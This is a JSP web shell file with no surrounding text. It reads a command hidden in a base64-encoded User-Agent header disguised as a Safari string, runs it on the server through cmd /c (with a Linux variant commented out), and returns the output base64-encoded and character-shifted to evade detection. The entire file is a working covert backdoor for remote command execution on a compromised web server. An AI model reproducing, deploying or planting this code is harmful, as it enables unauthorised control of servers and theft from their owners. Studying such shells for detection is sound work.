<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="sun.misc.BASE64Encoder" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page contentType="text/html; charset=utf-8"%>
<%!
    public String xxx(String x) {
        StringBuffer mBuffer = new StringBuffer("");
        char s;
        for (int j=0 ;j < x.length() ;j++){
            s = (char)((byte)x.charAt(j)+1);
            mBuffer.append(s);
        }
        return mBuffer.toString();
    }
%>
<%
    String userAgent = request.getHeader("User-Agent");
    String dd = userAgent;
    //System.out.println(dd);
    dd = dd.replace("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_ Version/5.1 Safari/534.50", "");
    dd = dd.replace("6_8; en-us) AppleWebKit/53", "");
    dd = dd.replace("4.50 (KHTML, like Gecko)", "");
    String qq = new String(new BASE64Decoder().decodeBuffer(dd));
    //System.out.println(qq);
    String jj="";
    Process p= Runtime.getRuntime().exec("cmd /c "+qq);//windwos
    //Process p= Runtime.getRuntime().exec(qq);//linux
    InputStream fis=p.getInputStream();
    InputStreamReader isr=new InputStreamReader(fis);
    BufferedReader br=new BufferedReader(isr);
    String line=null;
    while((line=br.readLine())!=null)
    {
        jj= jj.concat(line).concat("\n");
        //out.println(line);
    }
    byte [] jj_1 = jj.getBytes();
    String out_base64_en = new BASE64Encoder().encodeBuffer(jj_1);
    //System.out.println(out_base64_en);
    String ss = xxx(out_base64_en);
    //System.out.print(ss);
    //out.print("<pre>");
    out.println(ss);
    //out.print("<pre>");
%>
